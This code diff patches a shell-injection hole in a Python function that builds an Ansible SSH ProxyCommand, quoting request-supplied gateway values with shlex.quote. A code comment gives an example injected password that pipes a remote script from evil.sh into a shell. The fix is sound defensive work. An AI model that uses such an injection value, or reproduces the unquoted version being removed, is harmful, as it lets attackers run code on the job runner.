@@ -6,6 +6,7 @@ import asyncio
 import datetime
 import json
 import os
+import shlex
 from typing import Any
 
 import structlog
@@ -206,23 +207,36 @@ def _build_ansible_cmd(yaml_path: str, inventory: str, extra_vars: dict) -> list
     gw_pass = ev.pop("_gateway_password", None)
 
     if gw_host and gw_user:
-        # Build ProxyCommand for SSH bastion/gateway access
+        # ProxyCommand is run by ssh through /bin/sh, so these values land in a
+        # shell even though the ansible-playbook argv itself is passed as a list
+        # to create_subprocess_exec. They come from job extra-vars, i.e. from the
+        # request, so every one of them must be quoted or a gateway password like
+        # `'; curl evil.sh | sh; '` executes on the runner.
+        q_host = shlex.quote(str(gw_host))
+        q_user = shlex.quote(str(gw_user))
+        q_port = shlex.quote(str(gw_port))
+
         if gw_pass:
             proxy_cmd = (
-                f"sshpass -p '{gw_pass}' ssh -W %h:%p "
+                f"sshpass -p {shlex.quote(str(gw_pass))} ssh -W %h:%p "
                 f"-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
-                f"-p {gw_port} {gw_user}@{gw_host}"
+                f"-p {q_port} {q_user}@{q_host}"
             )
         else:
             proxy_cmd = (
                 f"ssh -W %h:%p "
                 f"-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "
-                f"-p {gw_port} {gw_user}@{gw_host}"
+                f"-p {q_port} {q_user}@{q_host}"
             )
+        # Two levels of parsing, so two levels of quoting. Ansible shlex-splits
+        # ansible_ssh_common_args before handing it to ssh, so the ProxyCommand
+        # value is quoted with shlex.quote rather than wrapped in literal single
+        # quotes — the quotes shlex.quote emits above would otherwise terminate a
+        # hand-written '...' early and split the command back onto ssh's argv.
         ev["ansible_ssh_common_args"] = (
             f"-o StrictHostKeyChecking=no "
             f"-o UserKnownHostsFile=/dev/null "
-            f"-o ProxyCommand='{proxy_cmd}'"
+            f"-o ProxyCommand={shlex.quote(proxy_cmd)}"
         )
         log.info("gateway_proxy_configured", gw_host=gw_host, gw_port=gw_port, gw_user=gw_user)
 
